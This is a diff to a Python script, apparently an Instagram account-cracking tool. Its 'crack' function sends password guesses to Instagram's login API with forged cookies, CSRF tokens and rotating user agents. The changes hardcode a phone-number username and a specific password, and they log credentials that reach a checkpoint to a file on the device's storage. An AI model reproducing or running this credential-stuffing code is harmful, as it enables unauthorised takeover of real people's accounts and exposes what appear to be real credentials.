@@ -103,7 +103,7 @@ def crack(uid, password_list, total_count):
             response = session.get('https://www.instagram.com/accounts/login/')
             csrftoken = response.cookies.get('csrftoken')
             time_now = int(datetime.now().timestamp())
-            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
+            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{'sumon@12M'}"
             cookies = {
             'datr': 'wDF1aOt9UdNuCskTeplHs7Yx',
             'ig_did': '534026BE-B655-4318-AB86-5CFD617D4D50',
@@ -131,7 +131,7 @@ def crack(uid, password_list, total_count):
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
+            'user-agent': UserAgent(),
             'x-asbd-id': '359341',
             'x-csrftoken': csrftoken,
             'x-ig-app-id': '936619743392459',
@@ -147,7 +147,7 @@ def crack(uid, password_list, total_count):
             'optIntoOneTap': 'false',
             'queryParams': '{"flo":"true"}',
             'trustedDeviceRecords': '{}',
-            'username': uid,
+            'username': '8101729293',
             'jazoest': '22898',}
             # Make API request
             response = session.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data)
@@ -167,6 +167,8 @@ def crack(uid, password_list, total_count):
                 continue
             elif 'checkpoint_required' in response.text:
                 print(f"\r\033[1;93m [⚠ CHECKPOINT] {uid} | {pw}")
+                open("/sdcard/SUMON_INS_CP.txt","a").write(uid+"|"+pw+"\n")
+                cps.append(uid)
                 continue
             else:
                 #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
